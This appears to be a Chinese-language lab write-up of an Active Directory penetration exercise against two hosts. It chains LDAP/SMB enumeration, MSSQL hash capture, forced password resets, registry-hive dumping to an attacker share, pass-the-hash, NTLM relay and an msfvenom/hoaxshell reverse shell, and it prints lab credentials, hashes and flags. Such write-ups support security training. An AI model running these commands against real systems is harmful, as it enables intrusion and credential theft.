## 关联机器记录

### 192.168.119.158

针对目标服务器进行相应的端口扫描

```
sudo nmap -p- -Pn -vvv --min-rate 1000 192.168.119.158 
```

![image-20250112221323251](https://s2.loli.net/2025/01/12/XGlgjMAn8TZtQPB.png)

```
sudo nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -Pn -A 192.168.119.158 -oN 192.168.119.158.txt
```

![image-20250112221351804](https://s2.loli.net/2025/01/12/SB1J7kL3qghTctx.png)

针对ldap进行信息收集

```
ldapsearch -x -s base namingcontexts -H ldap://192.168.119.158:389
```

![image-20250112223630751](https://s2.loli.net/2025/01/12/y7VcFsGEpiqLH3b.png)

```
ldapsearch -x -b "DC=zeus,DC=corp" -H ldap://192.168.119.158:389
```

![image-20250112223646586](https://s2.loli.net/2025/01/12/MzqDk8KGRlxgpmZ.png)

```
netexec smb 192.168.119.158 -u guest -p '' --shares
```

![image-20250112224020711](https://s2.loli.net/2025/01/12/74FVa8nAIjezNUk.png)

```
impacket-mssqlclient 'db_user':'Password123!'@192.168.119.158 -windows-auth
```

![image-20250112231947693](https://s2.loli.net/2025/01/12/FJixUjad3276PcI.png)

从各个表中没有什么收获

我们来执行获得hash

```
sudo impacket-smbserver share . -smb2support
exec xp_dirtree "\\192.168.45.232\share"
```

![image-20250112232413390](https://s2.loli.net/2025/01/12/YJg91fFwPpLIuQy.png)

```
svc_mssql$::zeus:aaaaaaaaaaaaaaaa:6c690fb752b424ad08cbe6650778a659:
```



```
bloodhound-python -d 'zeus.corp' -u 'o.foller' -p 'EarlyMorningFootball777' -k -c all -ns 192.168.119.158
```

```
sekurlsa::pth /user:administrator /domain:192.168.119.158 /ntlm:97db5c87465431b9091d47a58fe76483
```

![image-20250113234708225](https://s2.loli.net/2025/01/13/EVt8erF6gAhP413.png)

```
netexec smb 192.168.119.158 -u o.foller -p 'EarlyMorningFootball777' --rid-brute
```

我们获取了一个users.txt

```
impacket-GetNPUsers zeus.corp/ -usersfile users.txt -dc-ip 192.168.119.158
```

我们在获得z.thomas的账号后，我们沿着bloodhound的顺序来进行

![image-20250114005749336](https://s2.loli.net/2025/01/14/nYHXvPeosZiQag8.png)



具有genericall权限，我们直接强制修改密码

```
net rpc password "D.CHAMBERS" -U "zeus.corp"/"z.thomas"%"^1+>pdRLwyct]j,CYmyi" -S 192.168.119.158
Password@123
```

![image-20250114010041929](https://s2.loli.net/2025/01/14/YkAsXqEnGPW3CiV.png)

```
evil-winrm -i 192.168.119.158 -u D.CHAMBERS -p 'Password@123'
```

![image-20250114010200911](https://s2.loli.net/2025/01/14/3CXOUwkTLsZ2EiD.png)

```
evil-winrm -i 192.168.119.158 -u z.thomas -p '^1+>pdRLwyct]j,CYmyi'
```

![image-20250114010404536](https://s2.loli.net/2025/01/14/T9G34yrU8sHJxOg.png)

我们优先获得第一个flag

cf96f3ded122efe85d732bd3568cfb79

接下来我们通过backup组来提权

```
sudo impacket-smbserver share . -smb2support
impacket-reg "zeus.corp"/"D.CHAMBERS":"Password@123"@"192.168.119.158" save -keyName 'HKLM\SAM' -o '\\192.168.45.169\share'
impacket-reg "zeus.corp"/"D.CHAMBERS":"Password@123"@"192.168.119.158" save -keyName 'HKLM\SECURITY' -o '\\192.168.45.169\share'
impacket-reg "zeus.corp"/"D.CHAMBERS":"Password@123"@"192.168.119.158" save -keyName 'HKLM\SYSTEM' -o '\\192.168.45.169\share'

reg save HKLM\SYSTEM C:\system.hive
impacket-secretsdump -sam "SAM.save" -security "SECURITY.save" -system "system.hive" LOCAL
```

![image-20250114012153301](https://s2.loli.net/2025/01/14/YIME7pR62l5fHDh.png)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:650836aac5e819c6afb991606f63f5c3

```
evil-winrm -i 192.168.119.158 -u administrator -H '650836aac5e819c6afb991606f63f5c3'
```

![image-20250114012313000](https://s2.loli.net/2025/01/14/5CBpqeflJ4nNDUO.png)

获得第二个flag

2608bb839f7bc5abad90615b85a47a12

### 192.168.119.159

针对目标服务器进行端口扫描

```
sudo nmap -p- -Pn -vvv --min-rate 1000 192.168.119.159
```

![image-20250112222446324](https://s2.loli.net/2025/01/12/q5Uu1TvIWJxQftR.png)

```
sudo nmap -p135,139,445,5040 -Pn -A 192.168.119.159 -oN 192.168.119.159.txt
```

![image-20250112222508378](https://s2.loli.net/2025/01/12/ySPYfXkRiLIA4aj.png)

```
netexec smb 192.168.119.159 -u guest -p '' --shares
```

![image-20250112225242764](https://s2.loli.net/2025/01/12/nKaY9j1lue5EfpP.png)

我们使用smbclient等方法都无法进行匿名登录，我们尝试使用impacket-smbclient

```
impacket-smbclient 'zeus.corp'/guest@192.168.119.158
```

![image-20250112231350988](https://s2.loli.net/2025/01/12/AbMCXwntOZu4z2R.png)

让我们来查看这个sql文件

```
cat connection.sql
```

![image-20250112231417797](https://s2.loli.net/2025/01/12/o1XmnMbkLvHpEOA.png)

| username          | password     |
| ----------------- | ------------ |
| zeus.corp\db_user | Password123! |

我们来进行破解，但各种尝试后无法执行，考虑到我们之前看到各台的signing是false的状态，我们可以考虑使用中继

```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.119.159 -i
impacket-mssqlclient 'db_user':'Password123!'@192.168.119.158 -windows-auth
exec xp_dirtree "\\192.168.45.169\share"
```

![image-20250113205502961](https://s2.loli.net/2025/01/13/QmBXz42xNwIAa7c.png)

```
nc 127.0.0.1 11000
```

![image-20250113205918838](https://s2.loli.net/2025/01/13/qlX7Wzti1ZdcmRN.png)

![image-20250113211520749](https://s2.loli.net/2025/01/13/Unrm5I42HvxFE3c.png)

这种方法确实获得了相应的flag

234f97fb21006d020dde2d97c52576ed

我们没有发现其他有意义的内容，我们尝试使用msf来反弹shell，或者我们可以使用hoaxshell



```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=443 -f hta-psh -o p.hta 
sudo .venv/bin/python hoaxshell.py -s 192.168.45.169 --port 443
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.119.159 -c "powershell.exe -nop -w hidden -e "
```

![image-20250113225740011](https://s2.loli.net/2025/01/13/NPiAVZghlqMIf1W.png)

我们上传mimikatz和conptyshell

```

token::elevate
```
